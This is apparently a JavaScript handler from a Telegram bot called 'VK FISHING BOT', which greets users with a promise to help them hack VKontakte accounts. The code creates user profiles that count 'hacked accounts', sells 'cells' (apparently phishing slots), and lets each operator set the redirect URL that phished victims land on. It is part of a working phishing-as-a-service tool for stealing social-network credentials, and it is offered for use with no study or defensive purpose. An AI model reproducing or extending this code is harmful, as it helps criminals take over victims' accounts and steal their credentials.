var get_user = require("../functions/get_user"),
    save_user = require("../functions/save_user"),
    fs = require("fs"),
    generator = require('generate-password');

module.exports = {
	r: /^(.*)$/i,
	f: function (msg, chatId, args, data) {
        fs.access(`./users/${chatId}.json`, function(error) {
            if (error) {
                fs.open(`./users/${chatId}.json`, 'w', (err) => {
                    var file = {
                        name: `Участник `,
                        edit_name: false,
                        id: chatId,
                        link: "https://vk.com/feed",
                        past_message: 0,
                        hacked_accounts: 0,
                        cells: {
                          lvl: 1,
                          hacked: 0,
                          condition: false
                        },
                        code_pay: generator.generate({length: 10, numbers: false})
                    }

                    fs.writeFile(`./users/${chatId}.json`, JSON.stringify(file), function writeJSON(err) {});
                    return data({
                        text: `<b>Добро пожаловать в VK FISHING BOT 🗽</b>\n<i>Я помогу тебе взломать пользователей ВК ✨</i>`,
                        keyboard: [
                            [{"text": `Мои ссылки 🌐`, callback_data: "link"}],
                            [{"text": `Приобрести ячейки 📂`, callback_data: "cells"}],
                            [{"text": "Другое 🦋", callback_data: "other"}],
                            [{"text": "Резервный канал 🔍", url: "https://t.me/vk_fishing_bot_news"}]
                        ]
                    });
                })
            } else {
                get_user.start(chatId, (info) => {
                    if(info.edit_name == true) {
                        if(args[1] < 5) {
                            return data({
                                text: `<b>⚠️ Ошибка ⚠️</b>\n<i>Минимальная длина ника - 5 символов</i>`,
                                keyboard: [[{"text": `Отмена ❌`, callback_data: "canel"}]]
                            });
                        }
                        if(args[1].length > 30) {
                            return data({
                                text: `<b>⚠️ Ошибка ⚠️</b>\n<i>Максимальная длина имени - 30 символов</i>`,
                                keyboard: [[{"text": `Отмена ❌`, callback_data: "canel"}]]
                            });
                        }

                        info.edit_name = false;
                        info.name = args[1];

                        data({
                            text: `<b>Имя успешно изменено ✅</b>`,
                            keyboard: [[{"text": `⏪ Меню`, callback_data: "menu"}]]
                        })
                    }
                    if(info.l_edit == true) {
                        if(validateURL(msg.text) == false) {
                            return data({
                                text: `<b>⚠️ Ошибка ⚠️</b>\n<i>Что-то не так с ссылкой, попробуй ещё раз</i>`,
                                keyboard: [[{"text": `Отмена ❌`, callback_data: "canel"}]]
                            });
                        }
                        info.link = args[1];
                        data({
                            text: `<b>Ссылка редиректа успешно изменена ✅</b>`,
                            keyboard: [[{"text": `⏪ Меню`, callback_data: "menu"}]]
                        });
                    }
                    return save_user.start(chatId, info);
                });
            }
        });
	},
	desc: "",
	rights: 0,
	type: "all"
}

function validateURL(textval) {
    var urlregex = new RegExp("^(http|https|ftp)\://([a-zA-Z0-9\.\-]+(\:[a-zA-Z0-9\.&amp;%\$\-]+)*@)*((25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9])\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[0-9])|([a-zA-Z0-9\-]+\.)*[a-zA-Z0-9\-]+\.(com|edu|gov|int|mil|net|org|biz|arpa|info|name|pro|aero|coop|museum|[a-zA-Z]{2}))(\:[0-9]+)*(/($|[a-zA-Z0-9\.\,\?\'\\\+&amp;%\$#\=~_\-]+))*$");
    return urlregex.test(textval);
  }